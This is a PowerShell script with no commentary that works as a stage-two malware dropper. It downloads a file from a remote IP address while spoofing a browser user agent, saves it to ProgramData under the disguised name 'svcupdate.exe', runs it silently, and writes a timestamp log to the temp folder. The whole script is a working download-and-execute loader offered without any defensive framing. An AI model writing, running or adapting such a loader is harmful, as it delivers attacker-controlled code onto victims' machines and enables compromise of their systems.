
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://198.51.100.205/update.dat",
    [string]$WorkingPath = "C:\ProgramData\svcupdate.exe",
    [int]$TransferTimeout = 203,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Get-Stage2Payload -SourceUrl $TransferUrl -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
if ($ResultObject) {
    Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
}

Set-Location -Path $env:TEMP
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
